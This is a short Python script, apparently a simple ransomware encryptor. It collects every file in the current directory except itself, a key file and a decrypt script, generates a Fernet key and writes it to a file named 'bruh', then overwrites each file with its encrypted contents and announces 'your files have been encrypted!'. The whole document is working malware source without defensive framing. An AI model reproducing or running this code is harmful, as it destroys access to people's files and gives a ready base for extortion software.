#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

f = []

for file in os.listdir():
    if file == "main.py" or file == "bruh" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        f.append(file)

print(f)

hash = Fernet.generate_key()

with open("bruh","wb") as key:
        key.write(hash)

for file in f:
        with open(file, "rb") as files:
            content = files.read()
        content_encrypted = Fernet(hash).encrypt(content)
        with open(file, "wb") as files:
            files.write(content_encrypted)

print("your files have been encrypted!")